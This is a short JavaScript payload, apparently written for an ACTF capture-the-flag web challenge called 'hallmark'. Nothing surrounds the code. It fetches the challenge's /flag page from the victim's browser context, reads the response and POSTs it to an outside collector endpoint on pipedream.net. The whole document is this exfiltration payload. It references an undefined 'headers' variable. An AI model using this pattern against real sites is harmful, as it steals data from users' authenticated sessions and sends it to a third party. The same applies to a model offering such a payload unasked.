fetch("https://hallmark.web.actf.co/flag",{
            "mode": "no-cors"
        }).then(function(a) {
    a.text().then(owo => {
      const options = {
      method: "POST",
      headers,
      mode: "cors",
      body: JSON.stringify(owo),
      }

      fetch("https://eolimcwppmmjo1s.m.pipedream.net", options)
        
    })
})
